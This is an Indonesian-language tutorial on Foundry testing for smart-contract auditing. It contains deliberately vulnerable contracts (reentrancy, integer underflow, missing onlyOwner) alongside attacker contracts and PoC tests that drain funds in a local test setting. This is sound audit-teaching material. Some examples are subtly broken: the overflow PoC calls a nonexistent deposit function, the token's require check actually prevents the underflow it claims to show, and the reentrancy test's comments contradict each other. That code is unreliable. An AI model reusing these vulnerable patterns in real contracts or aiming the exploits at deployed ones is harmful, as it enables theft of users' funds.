# 05 — Foundry/Forge Testing & PoC Exploit

Panduan menulis test dan Proof-of-Concept (PoC) exploit menggunakan Foundry untuk **membuktikan** kerentanan smart contract.

## Setup Proyek Foundry

```bash
# Inisialisasi proyek
forge init audit-project
cd audit-project

# Install OpenZeppelin (untuk standar & mocks)
forge install OpenZeppelin/openzeppelin-contracts

# Konfigurasi remapping (otomatis dibuat oleh forge install)
# pastikan foundry.toml punya:
#   remappings = ['@openzeppelin/=lib/openzeppelin-contracts/']
```

Struktur:
```
audit-project/
├── src/          # kontrak yang diaudit (copy dari target)
├── test/         # test & PoC
├── script/       # deploy scripts
└── foundry.toml
```

## Menulis Test Dasar

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {MyContract} from "../src/MyContract.sol";

contract MyContractTest is Test {
    MyContract public c;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        c = new MyContract();
        // deal ETH ke attacker untuk test
        vm.deal(attacker, 100 ether);
    }

    function test_normalFlow() public {
        // test fungsional normal
        vm.prank(owner);
        c.deposit{value: 1 ether}();
        assertEq(address(c).balance, 1 ether);
    }
}
```

## Menulis PoC Exploit (Membuktikan Kerentanan)

Tujuan PoC: **menunjukkan bahwa exploit berhasil**. Jika test exploit **gagal** (revert yang tidak diharapkan / state berubah tidak semestinya), itu bukti kerentanan.

### Contoh 1: PoC Reentrancy (SWC-107)

Kontrak rentan:
```solidity
contract VulnerableBank {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint bal = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: bal}(""); // call SEBELUM update state
        require(ok, "fail");
        balances[msg.sender] = 0; // update state SETELAH call -> rentan
    }
}
```

Kontrak attacker:
```solidity
contract Attacker {
    VulnerableBank public bank;
    uint public count;
    constructor(address _bank) { bank = VulnerableBank(_bank); }
    receive() external payable {
        if (count < 5) { count++; bank.withdraw(); } // reentrancy loop
    }
    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }
}
```

PoC test:
```solidity
contract ReentrancyPoC is Test {
    function test_reentrancyExploit() public {
        VulnerableBank bank = new VulnerableBank();
        Attacker atk = new Attacker(address(bank));
        vm.deal(address(atk), 1 ether);

        atk.attack{value: 1 ether}();

        // Jika exploit berhasil, attacker punya > 1 ether (drain bank)
        assertGt(address(atk).balance, 1 ether);
        // Test ini akan GAGAL jika kontrak rentan (karena assertGt terpenuhi = exploit berhasil)
        // Sebenarnya untuk membuktikan kerentanan, kita tunjukkan bank terkuras:
        assertEq(address(bank).balance, 0); // bank habis padahal hanya deposit 1 ether
    }
}
```

> **Cara membaca hasil**: Jika `assertEq(address(bank).balance, 0)` **lolos** (bank terkuras), itu membuktikan reentrancy. Tulis komentar jelas di test.

### Contoh 2: PoC Integer Overflow (SWC-101)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6; // versi lama tanpa SafeMath bawaan

contract OverflowToken {
    mapping(address => uint) public balances;
    function transfer(address to, uint amount) public {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount; // underflow jika amount > balance
        balances[to] += amount;         // overflow
    }
}
```

PoC:
```solidity
contract OverflowPoC is Test {
    function test_underflow() public {
        OverflowToken t = new OverflowToken();
        // deposit 1 token
        t.deposit{value: 0}(); // sesuaikan dengan kontrak
        // transfer lebih dari balance -> underflow
        t.transfer(address(0x2), 2); // balance jadi 2^256-1
        assertEq(t.balances(address(this)), type(uint).max); // terbukti underflow
    }
}
```

### Contoh 3: PoC Access Control (SWC-105 / SWC-115)

```solidity
contract Vault {
    address public owner;
    constructor() { owner = msg.sender; }
    function withdrawAll() public { // TIDAK ada onlyOwner!
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok);
    }
}
```

PoC:
```solidity
contract AccessControlPoC is Test {
    function test_anyoneCanWithdraw() public {
        Vault v = new Vault();
        vm.deal(address(v), 10 ether);
        vm.prank(address(0xBAD)); // attacker bukan owner
        v.withdrawAll(); // BERHASIL -> kerentanan terbukti
        assertEq(address(v).balance, 0);
    }
}
```

## Cheatsheet Cheatcode Foundry yang Berguna

| Cheatcode | Fungsi |
|---|---|
| `vm.prank(addr)` | Set msg.sender untuk transaksi berikutnya |
| `vm.startPrank(addr)` | Set msg.sender untuk semua transaksi berikutnya |
| `vm.deal(addr, amt)` | Beri ETH ke alamat |
| `vm.warp(ts)` | Set block.timestamp |
| `vm.roll(num)` | Set block.number |
| `vm.expectRevert()` | Harapkan revert |
| `vm.assume(cond)` | Fuzz filter |
| `vm.store(addr, slot, val)` | Tulis storage langsung |
| `vm.load(addr, slot)` | Baca storage |
| `vm.createSelectFork(url)` | Fork mainnet |
| `vm.mockCall(...)` | Mock external call |

## Menjalankan Test

```bash
# Jalankan semua test
forge test

# Jalankan test spesifik
forge test --match-test test_reentrancyExploit

# Verbose (tampilkan console.log)
forge test -vvv

# Fuzz test
forge test --fuzz-runs 1000
```

## Praktik Terbaik PoC

1. **Satu PoC per kerentanan** — jelas dan fokus.
2. **Beri nama deskriptif**: `test_<vuln>_<exploit>`.
3. **Tulis komentar** yang menjelaskan mengapa ini membuktikan kerentanan.
4. **Sertakan kontrak attacker** jika perlu (reentrancy, dll).
5. **Setelah perbaikan**, tulis test regresi yang **lolos** (memastikan bug tidak kembali).
6. Simpan PoC di folder `test/` dan hasilnya di laporan.
